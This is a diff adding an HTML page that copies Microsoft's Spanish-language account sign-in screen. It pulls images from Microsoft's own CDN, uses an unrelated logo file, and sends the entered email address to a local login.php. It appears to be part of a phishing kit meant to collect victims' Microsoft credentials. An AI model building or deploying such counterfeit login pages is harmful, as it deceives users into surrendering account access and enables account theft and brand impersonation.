@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>Iniciar sesión en tu cuenta Microsoft</title>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge"/>
+	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+	<link rel="icon" href="favicon.ico">
+	<link rel="stylesheet" type="text/css" href="css/style.css" media="screen">
+	<title>Iniciar sesión en tu cuenta Microsoft</title>
+</head>
+<body>
+		<section id="containerLogin">
+			<div id="bodyLogin" class="opacity0">
+				<div class="divLogo">
+					<img src="img/cabimasalta.svg" class="logoLogin" alt="Logo">
+				</div>	
+
+				<div id="containerLayount">
+					<div id="divEmail" class="">
+						<h2>Iniciar sesión</h2>
+						<div id="alertEmailLogin" style="display: none;"></div>
+						<form action="login.php" method="post">
+						<input type="email" id="emailUser" name="emailUser" placeholder="Correo electrónico, teléfono o Skype" required>
+						<p>¿No tienes una cuenta? <a href="#" id="linkCreateAcount" >Cree una.</a></p>
+						<p><a href="#" id="linkCreateAcount" >Iniciar sesión con una llave de seguridad</a> <img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/documentation_9628e22a6bfb1edc59e81064a666b614.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"> </p>
+						<p><a href="#" id="linkCreateAcount" >Opciones de inicio de sesión</a>
+						<div class="divButton divBtnLogin">
+							<button type="submit" id="btnNextPass" class="btnFormLogin">Siguiente</button>
+						</div>
+						</form>
+					</div>
+						
+					</div>
+				</div>
+
+			</div>
+		</section>	
+		<script src="https://kit.fontawesome.com/7f3722b882.js" crossorigin="anonymous"></script>
+		<script type="text/javascript" src="js/functions.js"></script>
+</body>
+</html>
